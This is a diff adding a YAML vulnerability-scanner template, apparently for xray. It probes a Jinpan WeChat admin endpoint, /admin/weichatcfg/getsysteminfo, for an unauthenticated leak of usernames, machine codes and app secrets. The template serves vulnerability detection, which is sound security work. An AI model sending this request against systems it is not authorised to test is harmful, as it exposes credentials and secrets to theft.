@@ -1,0 +1,16 @@
+name: poc-yaml-jinpan-wx-getsysteminfo-info-leak
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /admin/weichatcfg/getsysteminfo
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("\"username\"") && response.body_string.contains("\"username\"") && response.body_string.contains("\"machinecode\"") && response.body_string.contains("{\"id\"") && response.body_string.contains("\"appsecret\"")
+expression: r0()
+detail:
+    author: xiaobaicai
+    links:
+        - https://www.ddpoc.com/poc/DVB-2023-4585.html
